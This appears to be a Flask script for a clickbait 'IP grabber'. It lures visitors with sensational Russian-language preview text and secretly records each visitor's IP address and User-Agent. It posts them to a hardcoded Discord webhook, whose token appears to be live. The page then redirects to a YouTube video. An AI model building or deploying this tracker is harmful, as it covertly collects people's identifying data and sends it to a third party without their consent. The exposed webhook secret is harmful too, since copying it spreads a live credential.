from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

# Настройки
CLICKBAIT_TITLE = "😱 ШОК! Ты не поверишь, что здесь скрыто..."
CLICKBAIT_DESCRIPTION = "🔥 Эксклюзив! Это должно было остаться в секрете, но утекло в сеть. Скорее смотри, пока не удалили!"
CLICKBAIT_IMAGE = "https://lastfm.freetls.fastly.net/i/u/ar0/c053578dee276b51d053b51c6b855dc7.png"  # Заменить на реальную картинку
REAL_URL = "https://youtu.be/kk3_5AHEZxE?si=7IPBytfu0W27ML1_"  # Настоящая ссылка
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1338142323795824691/ox3HgetuOjqcKx-3AO1X6mb53Y-SfS8MBt3XU2M8GLVcgfNPE85Gk2Y8e5TDVYdsKUwt"  # Вставь свой Webhook

# Глобальный счётчик
click_count = 0

@app.route('/')
def home():
    return "Используйте /generate для создания ссылки."

@app.route('/generate')
def generate_link():
    return "Вот ваша кликбейт-ссылка: http://127.0.0.1:5000/Sosishcombat"

@app.route('/Sosishcombat')
def clickbait_page():
    global click_count
    click_count += 1

    # Получаем IP и User-Agent
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # Отправляем уведомление в Discord
    payload = {
        "content": f"🚨 Новый переход! Всего кликов: {click_count}\n**IP:** {user_ip}\n**User-Agent:** {user_agent}"
    }
    requests.post(DISCORD_WEBHOOK_URL, json=payload)

    # HTML-страница с OG-тегами
    html_content = f"""
    <html>
    <head>
        <title>{CLICKBAIT_TITLE}</title>

        <!-- Open Graph (OG) Meta Tags -->
        <meta property="og:title" content="{CLICKBAIT_TITLE}">
        <meta property="og:description" content="{CLICKBAIT_DESCRIPTION}">
        <meta property="og:image" content="{CLICKBAIT_IMAGE}">
        <meta property="og:url" content="http://127.0.0.1:5000/clickbait">
        <meta property="og:type" content="website">

        <!-- Twitter Cards -->
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="{CLICKBAIT_TITLE}">
        <meta name="twitter:description" content="{CLICKBAIT_DESCRIPTION}">
        <meta name="twitter:image" content="{CLICKBAIT_IMAGE}">

        <style>
            body {{
                font-family: Arial, sans-serif;
                text-align: center;
                background: linear-gradient(45deg, #ff416c, #ff4b2b);
                color: white;
                height: 100vh;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                margin: 0;
                animation: fadeIn 2s;
            }}
            h1 {{
                font-size: 3em;
                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
            }}
            p {{
                font-size: 1.5em;
                margin-top: 10px;
                opacity: 0.9;
            }}
            .spinner {{
                border: 6px solid rgba(255, 255, 255, 0.3);
                border-top: 6px solid white;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin-top: 20px;
            }}
            @keyframes fadeIn {{
                from {{ opacity: 0; }}
                to {{ opacity: 1; }}
            }}
            @keyframes spin {{
                0% {{ transform: rotate(0deg); }}
                100% {{ transform: rotate(360deg); }}
            }}
            .button {{
                background: white;
                color: #ff416c;
                border: none;
                padding: 15px 30px;
                font-size: 1.2em;
                border-radius: 10px;
                cursor: pointer;
                margin-top: 20px;
                transition: 0.3s;
            }}
            .button:hover {{
                background: #ff4b2b;
                color: white;
            }}
        </style>
        <script>
            setTimeout(function() {{
                window.location.href = "{REAL_URL}";
            }}, 5000);
        </script>
    </head>
    <body>
        <h1>{CLICKBAIT_TITLE}</h1>
        <p>Ты в шоке? 😱 Через 5 секунд ты узнаешь правду!</p>
        <div class="spinner"></div>
        <button class="button" onclick="window.location.href='{REAL_URL}'">Узнать правду</button>
    </body>
    </html>
    """
    return render_template_string(html_content)

if __name__ == '__main__':
    app.run(debug=True)
